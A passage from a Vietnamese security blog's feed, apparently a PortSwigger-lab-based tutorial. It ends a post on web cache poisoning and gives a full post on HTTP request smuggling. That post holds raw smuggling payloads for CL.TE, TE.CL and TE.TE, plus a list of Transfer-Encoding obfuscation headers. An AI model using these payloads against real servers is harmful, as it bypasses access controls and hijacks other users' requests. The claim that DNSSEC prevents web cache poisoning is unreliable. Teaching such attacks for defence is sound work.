tiên của cuộc tấn công WCP là xác định các đầu vào không bị khóa được máy chủ sử dụng .</p><p> Bạn có thể xác định các đầu vào một cách thủ công bằng cách thêm các header vào các request và quan sát xem chúng có ảnh hưởng đến response hay không. Bạn có thể sử dụng các công cụ có khả năng chặn bắt và thay đổi gói tinh như <a rel="noreferrer noopener" aria-label="Burp Suite (opens in a new tab)" href="https://portswigger.net/burp/communitydownload" target="_blank">Burp Suite</a> của PortSwigger hoặc <a rel="noreferrer noopener" aria-label="ZAP  (opens in a new tab)" href="https://www.zaproxy.org/download/" target="_blank">ZAP </a>của OWASP. Cách có thể rất trực quan nhưng nó đòi hỏi nhiều công sức và thời gian. </p><!-- wp:image {"align":"center","width":399,"height":263} --><div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.vietsunshine.com.vn/wp-content/uploads/2018/09/H%C6%B0%E1%BB%9Bng-d%E1%BA%ABn-Pentest-Black-Box-s%E1%BB%AD-d%E1%BB%A5ng-Burp-Suite-Ph%E1%BA%A7n-1-1.jpg" alt="Hướng dẫn Pentest Black Box sử dụng Burp Suite (Phần 1)" width="399" height="263"/><figcaption>Burp Suite</figcaption></figure></div><p>Thay vì vậy bạn có thể sử dụng các công cụ hỗ trợ như <a rel="noreferrer noopener" aria-label="Acunetix  (opens in a new tab)" href="https://www.acunetix.com/" target="_blank">Acunetix </a>- Scan lỗ hổng web tự động nhưng ta sẽ hơi bị động, <a rel="noreferrer noopener" aria-label="Param Miner (opens in a new tab)" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943" target="_blank">Param Miner</a> - một extention của Burp Suite giúp xác định các tham số (parm) bị ẩn, không liên  kết, đặc biệt hữu ích để tìm lỗ hổng độc hại bộ đệm web. </p><p>Mình khuyến khích các bạn nên dùng Burp Suite, nó thực sự hiệu quả.</p><p> <strong>Tìm ra mục độc hại trong các phản hồi từ server của mỗi input</strong> </p><p> Khi bạn đã xác định được đầu vào không phải key hoặc không bị khóa, bước tiếp theo là đánh giá chính xác cách trang web xử lý nó. Hiểu điều này là điều cần thiết để có thể tạo ra response độc hại. Nếu như giá trị từ đầu vào được nằm trong response từ máy chủ mà không bị loại bỏ hoặc được sử dụng tạo đường dẫn đến dữ liệu khác ( <strong>Host Header Attack</strong> ), thì đây là yếu tố có khả năng để làm ngộ độc web cache.</p><p> <strong>Lấy phản hồi được lưu trữ</strong> </p><p>Bước này chỉ là để kiểm tra việc đầu độc web cache đã thành công hay chưa. Việc đầu độc cache chiếm 50% tỉ lệ thành công còn lại phụ thuộc vào nhiều yếu tố khác như extention của file,content type, router,status code và response header.</p><p> Bạn nên dành một chút thời gian để tìm hiểu về các header, các request đến các server khác nhau  và nghiên cứu cách bộ đệm hoạt động thì việc hiểu và thực hiện tấn công sẽ dễ dàng hơn.</p><h4>Các mối đe dọa có thể xảy ra ?</h4><!-- wp:image {"width":592,"height":159} --><figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/cache-poisoning.svg" alt="web cache poisoning" width="592" height="159"/></figure><p> Như với hầu hết các loại tấn công,  Web cache poisoning  cũng có thể được sử dụng kết hợp với các cuộc tấn công khác để leo thang tác động lớn hơn nữa ví dụ các lỗ hổng phổ biến như XSS, JavaScript inject, Open redirect, v.v. </p><p> Response độc hại chỉ ảnh hưởng đến người dùng truy cập trang bị ảnh hưởng trong khi cache bị đầu độc. Do đó, tác dộng có thể dao động từ không tồn tại đến lớn tùy thuộc vào việc trang có phổ biến hay không. Ví dụ, nếu kẻ tấn công quản lý để đầu độc một phản hồi được lưu trong bộ nhớ cache trên trang chủ của một trang web lớn như Facebook , thì cuộc tấn công có thể ảnh hưởng đến hàng ngàn người dùng mà không có bất kỳ tương tác nào sau đó từ kẻ tấn công. </p><h4>Cách thức ngăn chặn lỗ hổng này</h4><p>Về vấn dề ngăn chặn lỗ hổng này mình không tìm được nhiều tài liệu chi tết. chỉ trung trung vào việc cấu hình năng cao cho việc lưu trữ vào cache trên server nhưng vấn đề còn phụ thuộc vào mục đích , công việc kinh doanh và do bên thứ 3 như các CDN.</p><p> Ngoài ra còn có các công cụ có sẵn để giúp các tổ chức ngăn chặn các cuộc tấn công ngộ độc cache. Công cụ ngăn chặn ngộ độc bộ nhớ cache phổ biến nhất có lẽ là DNSSEC ( Domain Name System Security Extension). DNSSEC là một công cụ chống độc cache được phát triển bởi Lực lượng đặc nhiệm kỹ thuật Internet ( Internet Engineering Task Force ) để cung cấp xác thực dữ liệu DNS an toàn. </p><p>Ok như vậy là minh đã xong phần giới thiệu về lỗ hổng Web Cache Poisoning , trong phần tiếp theo mình sẽ trình bày các kĩ thuật và cách đầu độc Cache. Cảm ơn và mời các bạn đón đọc!!!! Bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Là một trong những lỗ hổng yêu thích nên mình sẽ viết hơi dài dòng một chút nên phần này mình dành cho những bạn nào mới tìm hiểu nha . T
      
    
    </summary>
    
    
      <category term="Pentest Web" scheme="http://blog.hydrasky.ml/tags/Pentest-Web/"/>
    
  </entry>
  
  <entry>
    <title>HTTP Request Smuglling</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/HTTP%20Request%20Smuggling%20Attack/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/HTTP Request Smuggling Attack/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p> Một trong các lỗ hổng  dựa vào tính năng của giao thức HTTP từ đó tạo các các thông điệp HTTP message đặc biệt ,phía server sẽ phân tích và diễn giải các message nhận được theo ý của attacker. HTTP Request Smuggling gọi tắt là HRS là một kĩ thuật , phương tiện tấn công năng cao, được công bố trong một <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liêu</a> vào năm 2005 bởi một công ty công nghệ Wathfire . HRS là kĩ thuật can thiệp vào việc xử lý tuần tự các  HTTP request tới một web site từ một hoặc nhiều user.</p><figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/http-request-smuggling.svg" alt="What is HTTP request smuggling? Tutorial & Examples | Web Security ..."/><figcaption>src: PortSwigger</figcaption></figure><p>Lỗ hổng này thường được đánh giá ở mức Critical do HRS có khả năng bypass các kiểm soát truy cập, tường lửa web. Ngoài ra HRS còn là phương tiện để thực hiện các cuộc tấn công nguy hiểm khác như Web Cache Poisoning , Cross Site Scripting, Session Hijacking, Server-Side Requesr Forgery,Open Redirect,… Danh sách này còn có thể còn nhiều hơn nữa bởi còn nhiều kiểu tấn công chưa được khám phá.</p><h4> HTTP Request Smuggling sinh ra từ đâu?</h4><figure class="wp-block-image"><img src="https://documentation.help/DogeTool-HTTP-Requests-vt/http_requestmessageexample.png" alt="HTTP Request Message - HTTP Requests Documentation"/></figure><p>Hình trên là miêu tả các thành phần của một request, reponse chỉ hơi khác một chút , bây giờ mình cùng xem qua quy trình một gói request được xử lí nào !</p><p>Nhìn vào dòng request line ta sẽ thấy được server đang sử dụng giao thức HTTP/1.1 . Hiện nay  mặc dù Htpp/2 đã ra mắt để dần thay thế nó hay thậm chí Http/3 cũng được đề cập đến nhưng version này vẫn được sử dụng rất phổ biến rất , nó là bản nâng cấp của Http/1.0 với một tính năng mới cực kì hiệu quả cho việc truyền tải là 2 ae Keep-Alive và Pipeline. Để biết rõ về khác biệt giữa các version này là gì các bạn có thể tham khảo <a rel="noreferrer noopener" href="https://kipalog.com/posts/Luoc-su-tu-HTTP-1-toi-HTTP-2-va-tuong-lai-cua-HTTP" target="_blank">bài viết</a> này. </p><p>Một trong những vấn đề của Http 1.0 đó chính là chỉ có thể một connection tới một tài nguyên dẫn đến hiệu suất thấp và tốn nhiều thời gian,lưu lượng do quá trình bắt tay 3 bước TCP . Vì thế 2 tính năng Keep-Alive và Pipeline đã được thêm vào trong bản Http/1.1 để có thể tạo một connection tải nhiều tài nguyên . Với tính năng Keep-Alive, request sẽ được thêm một header đặc biệt là Connection: Keep-Alive , phía máy chủ sẽ nhận được request và hiểu là không được đóng kết nổi TCP , tương tự phía server sẽ dùng lại cái kết nối TCP này .Như vậy chỉ cần thực hiện một lần bắt tay ba bước , điều này có thể giảm lưu lượng tới máy chủ, tiết kiệm tài nguyên và tăng tốc truy cập. Tính năng này được bật mặc đinh khi sử dụng giao thức Http/1.1.</p><p>Đi cùng với Keep-Alive đó là Pipeline, để giải quyết vấn đề lộn xộn khi nhiều request cùng một lúc và thời gian khi phải chờ dợi response của request trước để thực hiện request tiếp theo trong cùng một connection.Http Pipeline sẽ cho phép việc gửi request liên tục mà không cần phải chờ đợi response của request trước nhưng vẫn phải theo tuần tự vào trước thì nhận trước. Tính năng này có một nhược điểm là nếu request trước nhận response chậm thì các request sau cũng phải chờ cho xong mới được nhận response của mình. Nhược điểm này còn có tên là head-of-line blocking, vấn đề này đã được khắc phục ở Http/2 và một biện pháp không liên quan nhưng lại có thể làm người ta quên đi pipeline nữa đó chính là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">CACHE</a> (tham khảo bài viết của mình). Cache rất hữu ích vì nó sẽ đưa HRS thành Web Cache Poisoning hehe.</p><p>Thực ra chúng ta chỉ cần quan tâm vè Keep-Alive cho lỗ hổng này, còn Pipeline thì không cần thiết vì tính năng này phức tạp,chứa nhược điểm lớn nên bình thường nó ko được dùng và bị disable trên trình duyệt,còn phía server vẫn hỗ trợ cho connection nào cần. Nhưng nói rồi thì nói luôn cho đỡ thắc mắc và mình đỡ quên hehe.</p><p>Ok như vậy với tính năng Keep-Alive ,request sẽ được  forward lần lượt đến Back-End Server thông qua Front-End Server (Proxy server, load banacer ) trên cùng một connection TLS/TCP. Ngoài ra khi đến Front-End Server,request cũng sẽ được phân tích để lưu vào cache .</p><!-- wp:image {"width":584,"height":328} --><figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial & Examples | Web Security ..." width="584" height="328"/></figure><p>Sau khi nhận request Back-End server sẽ phân tích các header của request để xác định khi nào sẽ kết thúc  một request vừa nhận và nhận request tiếp theo.</p><p>Lợi dụng điều này Attacker gửi một requets thập cẩm(nhưng có tính toán nha) để  lừa front-end server đó là 1 reuqest hợp lệ và chuyển tiếp đến Back-End. BE said “ bạn cho thì mình lấy thôi” , rồi  khi phân tích request  Back-End hiểu lầm là một phần của request thập cẩm đó là điểm bắt đầu và nó sẽ được gộp vào request sau đó (như phích và ổ cắm haha ). </p><figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial & Examples | Web Security ..."/></figure><p>Sau đó request vẫn được thực hiện một cách hợp lệ response sẽ được trả về  ,như vậy attacker đã can thiệp vào việc xử lí của ứng dụng. =&gt; Smuggling attack !!!</p><figure class="wp-block-image"><img src="https://memn0ps.github.io/images/2019-09-13-HTTP-Request-Smuggling-CL-TE/screenshot2.png" alt="screenshot2"/><figcaption>Ví dụ minh họa</figcaption></figure><h4>Cách thức tấn công HTTP request smuggling</h4><p>Như mình đã giới thiệu bên trên, HRS lần đầu tiên được đưa ra vào <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liệu</a> năm 2005 bởi Watchfire, trong đó có nhắc đến 2 kiểu được sử dụng là CL và CL.CL, tác động chủ yếu ở phía người dụng cộng hưởng với việc là kĩ thuật khó , CDN chưa phổ biến do đó nó không được nhắc quá nhiều.Và đến năm 2019, Jame Kettle đã làm cho nó sống lại với <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=w-eJM2Pc0KI" target="_blank">HTTP Desync Attacks</a> tại Black Hat và DEF CON cùng với đó là 3 kiểu mới được đưa ra là CL.TE, TE.CL và TE.TE.  Như vậy có thể chia ra làm 5 kiểu : CL, CL.CL, CL.TE, TE.CL và TE.TE, mình sẽ giải thích hết luôn hehe.</p><p>  CL và TE lần lượt viết tắt của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> và <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank">Transfer-Encoding</a> là 2 HTTP header . Content-Length cho biết kích thước của body của request, tính bằng byte, được gửi cho người nhận còn Transfer-Encoding chỉ định hình thức mã hóa (gzip, chunked.compress….) được sử dụng để đóng gói vận chuyển phần body một cách nhanh chóng, giải quyết được vấn đề của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> với dữ liệu lớn. Nhưng  tính năng quan trọng cần nhớ ở đây là 2 header này còn là cách xác định kết thúc một HTTP message. Đây là mấu chốt để thực hiện HRS ! </p><p>À còn một vấn đề nữa trước khi vào vấn đề là việc sử dụng các method HTTP (GET , POST, PUT …) phải hợp lí, không thể dùng bừa bởi vì mỗi methob đều có chức năng riêng và server sẽ xử lí khác nhau. Thế nên nó cũng ảnh hưởng đén việc tấn công bằng HRS,mình sẽ không thể giải thích cả vì nó sẽ quá dài mong các bạn lưu ý cả phần này. OK vào thôi  !</p><h3> **GET Request với CL ** </h3><p>Trong kiểu này không phải chỉ request GET có thể sử dụng, mình chỉ lấy như một ví dụ vì nó rất là điển hình.Tất cả các yêu cầu HTTP không mang body đều có khả năng làm điều này nhưng mình chưa biết hết hihi.</p><p>Trong tài liệu của <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Request_for_Comments" target="_blank">RFC</a> về HTTP/1.1 - <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a> không có quy định nào đề ra về việc cho phép yêu cầu GET mang thêm Body trong request như request POST và chỉ có một câu được đề cập trong phần 4.3.1 của tài liệu mới nhất của nó là  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7231#section-4.3.3" target="_blank">RFC7231</a>.</p><p>Sending a payload body on a GET request might cause some existing implementations to reject the request<br> </blockquote></p><p>Giả sử Front-End Server (Proxy Server) cho phép  GET request mang Body và Back-end Server không cho phép GET request mang Body.Như vậy Back-end Server sẽ  bỏ qua luônContent-Length header trong request GET và sẽ không xử lý nó.Điều này có thể dẫn đến request Smuggling. Cùng xem ví dụ nha.</p><p>GET / HTTP/1.1\r\n<br>Host: example.com\r\n<br>Content-Length: 44\r\n # 44 byte</p><p>GET / secret HTTP/1.1\r\n #độ dài của đoạn<br>Host: example.com\r\n     # này bằng 44 byte<br>\r\n</p><p>Front-end Server nhận được request và kiểm traContent-Length, xác định rằng đây là một request hoàn chỉnh và  chuyển tiếp nó đến back-end Server.Sau đó back-end Server nhận được nó, vì nó không xử lýContent-Length,  nên nó nghĩ rằng nó đang nhận được hai request. </p><p>First request<br>GET / HTTP/1.1\r\n<br>Host: example.com\r\n</p><p>Second request<br>GET / secret HTTP/1.1\r\n<br>Host: example.com\r\n</p><p>Done !!!</p><h3>CL.CL</h3><p>Trong mục 4.4 của <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank">RFC2616</a> và mục 4 của 3.3.3 trong  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank">RFC7230</a>, có ghi rằng khi request  mà máy chủ nhận được chứa hai hoặc nhiều hơn Content-Length header và  giá trị của các header này khác nhau thì nó sẽ trả về status code 400 hoặc 502. Như vậy khả năng cáo Server sẽ không chấp nhận request kiểu này và cũng vì thế người ta chỉ coi kiểu này chỉ ở mức ý tưởng. </p><p>If a message is received without Transfer-Encoding and witheither multiple Content-Length header fields having differingfield-values or a single Content-Length header field having aninvalid value, then the message framing is invalid and therecipient MUST treat it as an unrecoverable error. If this is arequest message, the server MUST respond with a 400 (Bad Request)status code and then close the connection. If this is a responsemessage received by a proxy, the proxy MUST close the connectionto the server, discard the received response, and send a 502 (Bad Gateway) response to the client. If this is a response messagereceived by a user agent, the user agent MUST close theconnection to the server and discard the received response.Các bạn tự dịch nhé !</blockquote></p><p>Nó đã được fix nhưng không sao mình vẫn sẽ trình bày về nó như trong tài liệu của Watchfire sử dụng nó để thực hiện HRS thành công.</p><p>Lần này mình lấy ví dụ dùng POST request,không như GET, server sẽ kiểm tra cả CL header để lấy dữ liệu  nhé !</p><p>POST / HTTP/1.1\r\n<br>Host: example.com\r\n<br>Content-Length: 8\r\n<br>Content-Length: 7\r\n</p><p>12345\r\n<br>a</p><p>Theo như minh tìm hiểu nếu như sử dụng 2 header CL thì thông thường Proxy Server sẽ lấy Content-Length đầu tiên còn Back-End sẽ phân tích và lấy Content-Length cuối cùng, tại sao thì mình chưa tìm ra nhưng nó không ảnh hưởng lắm nên thôi .</p><p> Lúc này độ dài của dữ liệu mà Proxy Server nhận được là 8 bytes , kiểm tra nội dung “12345\r\na” đã đủ và nó chuyển tiếp request như vậy đến BE server.Khi đến Back-end Server sẽ lấy giá trị của CL header cuối  là 7 bytes . Sau khi đọc 7 ký tự đầu tiên “12345\r\n” (Để lại “a” trong cache huhu), Back-end Server xác định rằng request đã được đọc và kết thúc request (Server sẽ gửi response tương ứng cho request này ).Như vậy cache vẫn còn có giữ chữ “a” thừa từ request trước.Lúc này Back-end Server cho rằng “a”là một phần của request tiếp theo.Nếu như thời điểm này có mình hoặc một người dùng thường khác gửi request đến Server như sau:</p><p>GET /index.html HTTP/1.1\r\n<br>Host: example.com\r\n</p><p>Như chúng ta đã biết từ trước, các kết nối TCP thường được sử dụng lại giữa máy chủ proxy và máy chủ nguồn. Nên request này sẽ được ghép vào sau  “a” giống như ổ cắm - Jame Kettle nói . Khi đó Back-end Server nhận được request như này :</p><p>aGET /index.html HTTP/1.1\r\n<br>Host: example.com\r\n</p><p>Làm gì có method aGET đúng không các bạn ? Server sẽ xử lí và trả về một lỗi tương tự như “aGET request method not found”.Như vậy là bạn đã có thể thực hiện một cuộc tấn HRS hay làm ảnh hưởng yêu cầu của người dùng khác và thậm trí mở rộng thành một cuộc tấn công khác như CSRF.</p><h3>CL-TE</h3><p> CL-TE có nghĩa là khi nhận được request có hai header này,  proxy server chỉ xử lý header Content-Length còn Back-End Server phía sau sẽ tuân thủ các quy định về <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a>, bỏ qua Content -Length, xử lý header Transfer-Encoding.</p><p>Transfer-Encoding có thể chỉ định nhiều kiểu mã hóa nhưng chúng ta chỉ cần quan tâm đến chunked -mã hóa kiểu khối .Định dạng dữ liệu chuyển kiểu khối như sau:</p><p>[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</p><p> trong đó giá trị của “size” được biểu thị bằng hệ thập lục phân. Khi chunk size bằng không có nghĩa là kết thúc nội dung của body.</p><img src="/images/HRS/chunk_transfer.png" class="[class names]" title="[500] [500] " alt="Cách đọc body request của TE"><p>Mình sẽ sử dụng lab của PortSwigger để làm lấy ví dụ luôn cho sinh động  ( thực tế sẽ khó hơn nhé) cùng với đó mình sẽ sử dụng BurpSuite và extention <a rel="noreferrer noopener" href="https://github.com/PortSwigger/http-request-smuggler" target="_blank">Http request Smuggler</a> của nó (Các bạn tự tìm hiểu nha), ngoài ra có 1 công cụ nữa là <a href="https://github.com/defparam/smuggler">smuggler</a> rất hữu hiệu cho các bạn săn bug :</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p><p>Đây là request mình sẽ check đầu tiên , cung như là cấu trúc của một request CL.TE:</p><img src="/images/HRS/image-3.png" class="[class names]" title="[500] [500] " alt="title text"><p>Vì Front-End Server xử lí  Content-Length, sau khi kiểm tra độ dài của payload body đúng là 36, FE coi đây là một request hoàn chỉnh và forward nó đi. </p><p>Chắc chắn sẽ có bạn thắc mắc về độ cài của body của request khi nhận được.Bạn nhìn  và đếm rõ rảng không đủ 36 bytes như content length hiện. Đây là do trong body còn dùng 2 kí tự ngắt dòng là CR (\r)  và LF  (\n), trong các ví dụ hình ảnh mình đưa ra sẽ lược bỏ nó đi cho đỡ rối mắt. :</p><!-- wp:preformatted --><pre class="wp-block-preformatted">0 \ r \ n\ r \ nGET /admin HTTP/1.1</pre><!-- /wp:preformatted --><p>Tiếp tục,khi gói tin được chuyển đến thì back-end sẽ xử lýTransfer-Encoding header.Nhưng đập vào mắt nó là  “0 \ r \ n”, nên Back-end cho rằng đã kết thúc request,để lại đoạn “GET /admin HTTP/1.1” trong cache, chờ đợi request tiếp theo đến. Kết quả trong lab mình thực hiện sẽ như thế này:</p><img src="/images/HRS/image-2.png" class="[class names]" title="[500] [500] " alt="title text"><p>Ok như vậy là đã có dấu hiệu để thực hiện tấn công HRS.</p><h3>TE.CL</h3><p>Khi bạn hiểu được CL.TE rồi thì đối với kiểu này nó cũng tương tự chỉ là đảo vế cho nhau thôi ( FE sẽ xử lí TE còn BE xử lí CL).PortSwigger cũng có lab  tương tự :</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p><img src="/images/HRS/image-4.png" class="[class names]" title="[500] [500] " alt="title text"><p>Request đến FE và xử lí TE, khi nó đọc dến “0 \ r \ n \ r \ n”, nó coi là dã đọc xong, request hoàn chỉnh và  chuyển tiếp đến máyBE  server. BE server xử lý CL,khi nó đọc đến “12 \ r \ n:, nó coi như là request đã kết thúc. Còn phần còn lại thì nó cho là của một yêu cầu khác</p><!-- wp:preformatted --><pre class="wp-block-preformatted">GPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</pre><p>Và reponse trả về với lỗi dễ hiểu</p><img src="/images/HRS/image-5.png" class="[class names]" title="[500] [500] " alt="title text"><p>Ok!</p><h3>TE.TE</h3><p>Đây kiểu cuối cùng, nó cũng tự như CL.CL là sử dụng 2 header TE trong reuqest nhưng mà nó vẫn chưa rõ quy chế như CL.CL (lỗi 400) trong tài liệu của RFC. Ở đây chúng ta cần tìm cách đưa TE.TE về 2 kiểu TE vs CL. Trick được đưa ra trong Portswigger là che dấu header TE, có dùng trong request nhưng không được xử lí.</p><p><a rel="noreferrer noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank">Link Lab PortSwigger</a></p><p>Trong trương hợp này cả 2 server đều muôn xử lí TE. Như các bạn đã biết TE sẽ có 5 giá trị mặc định (gzip, chunked, identity…), mình sẽ giấu một header bằng cách cho nó giá trị không tồn tại là “cow” và thêm cả CL vào request.</p><!-- wp:preformatted --><pre class="wp-block-preformatted">POST / HTTP/1.1\r\nHost: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nCookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\nContent-length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n</pre><!-- /wp:preformatted --><p>FE sẽ xử lí TE đầu tiên, nó kiểm tra đến khi đọc đến “0\r\n\r\n” . Request hoàn chỉnh và forward đến BE. BE xét header TE cuối nhưng có vấn đề và nó chuyển sang xử lí bằng CL. Như vậy trong trường hợp FE cử lí TE đầu tiền còn BE xử lí TE cuối thì ta đã đưa về kiểu TE.CL, còn nếu như FE xử lí TE cuối  còn BE xứ lí TE đầu thì ngược lại.</p><p>Ngoài cách này ra còn nhiều cách để thực hiện xáo trộn tiêu đề TE này như:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>HAproxy CVE-2019-18277 đã xử dụng cách này để khai thác bạn có thể tham khảo thêm. Dưới đây là 1 bài <a href="https://github.com/o-o-overflow/dc2020q-uploooadit">CTF</a> yêu cầu chụp lại request của người khác dựa vào CVE này và mình đã khai thác thành công. </p><div class="video-container"><iframe src="https://www.youtube.com/embed/SQIbpqVfd14" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p>OK như vậy là mình đã trình bày xong về các kiểu tấn công HRS, bạn không hiểu phần nào hãy để lại comment cho mình.</p><h3 id="6-how-to-prevent-http-request-smuggling">Cách ngăn chặn buôn lậu yêu cầu HTTP</h3><p>Chúng ta đã biết tác hại của lỗ hổng HTTP request Smuggling và chúng ta sẽ đặt câu hỏi: làm thế nào để ngăn chặn nó?Có ba cách phòng thủ chung (không dành riêng cho một máy chủ cụ thể nào cả nha).</p><ul><li>Vô hiệu hóa "reuse" sử dụng kết nối TCP - <a rel="noreferrer noopener" href="https://docs.apigee.com/api-platform/antipatterns/disable-persistent-connections" target="_blank">disable kết nối liên tục</a> (keep -alive) giữa proxy server và back-end server</li><li>Sử dụng giao thức HTTP/2. HTTP/2 có cách ngăn chặn HRS bằng các tính năng mới như "Request multiplexing over a single TCP connection, Compression of request headers"</li><li>Máy chủ front và back end  sử dụng cùng một máy chủ hoặc tất cả các máy chủ chạy cùng một phần mềm máy chủ web có cùng cấu hình ( Tránh các phiên bản cho phép lỗ hổng này diễn ra như <a rel="noreferrer noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-8004" target="_blank">Apache Traffic Server</a> (ATS) versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3 - <a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/" target="_blank" rel="noreferrer noopener">POC</a>).</li></ul><p>Tất nhiên các biện pháp trên chỉ có thể giải quyết vấn đề một cách cơ bản và còn nhiều khiếm khuyết như vô hiệu hóa việc sử dụng lại kết nối TCP giữa máy chủ proxy và máy chủ back-end, điều này sẽ làm tăng áp lực lên  back-end server.Sử dụng HTTP/2 thì không thể được quảng bá trong các điều kiện mạng hiện tại, ngay cả khi máy chủ hỗ trợ giao thức HTTP / 2 tương thích với HTTP / 1.1.Và xét về bản chất, lý do dẫn đến HTTP request Smuggling  không phải là vấn đề thiết kế giao thức mà là vấn đề của việc triển khai máy chủ khác nhau.Cá nhân mình nghĩ rằng giải pháp tốt nhất là thực hiện nghiêm túc theo các tiêu chuẩn quy định trong RFC7230-7235, nhưng đây là điều khó khăn nhất để đạt được bởi vì bản chất RFC chỉ là các bản nghiên cứu, tiêu chí phát triển được khuyến nghị chứ không phải là các chuẩn bắt buộc do đó vẫn xảy ra tình trạng bất đồng bộ giữa các máy chủ .</p><p>Cảm ơn các bạn đã đọc , mình rất thích lỗ hổng này nên chắc chắn sẽ có bài viết thêm về nó , mong các bạn đón đọc nha!</p><h2>Tài liệu tham khảo</h2><ul><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></li><li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a href="https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/">https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; Một trong các lỗ hổng  dựa vào tính năng của giao thức HTTP từ đó tạo các các thông điệp HTTP message đặc biệt ,phía server sẽ phân tích
      
    
    </summary>
    
    
      <category term="Pentest Web" scheme="http://blog.hydrasky.ml/tags/Pentest-Web/"/>
    
  </entry>
  
</feed>
